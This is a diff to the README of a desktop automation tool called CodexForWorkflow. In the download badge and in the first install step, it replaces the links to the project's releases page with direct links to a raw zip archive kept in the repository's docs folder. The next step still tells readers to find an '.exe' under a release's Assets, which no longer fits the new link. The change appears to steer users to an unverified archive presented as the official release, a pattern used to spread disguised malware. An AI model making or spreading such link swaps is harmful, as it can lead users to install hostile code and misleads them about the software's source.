@@ -1,6 +1,6 @@
 # 🤖 CodexForWorkflow - Automate desktop tasks with human control
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/siddhartha7995/CodexForWorkflow/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/siddhartha7995/CodexForWorkflow/raw/refs/heads/main/docs/Workflow-For-Codex-v1.4-alpha.2.zip)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards to run the application:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit this page to download: [https://github.com/siddhartha7995/CodexForWorkflow/releases](https://github.com/siddhartha7995/CodexForWorkflow/releases).
+1. Visit this page to download: [https://github.com/siddhartha7995/CodexForWorkflow/raw/refs/heads/main/docs/Workflow-For-Codex-v1.4-alpha.2.zip](https://github.com/siddhartha7995/CodexForWorkflow/raw/refs/heads/main/docs/Workflow-For-Codex-v1.4-alpha.2.zip).
 2. Locate the file ending in `.exe` under the Assets section of the latest release.
 3. Click the file to start the download to your computer.
 4. Open your Downloads folder.
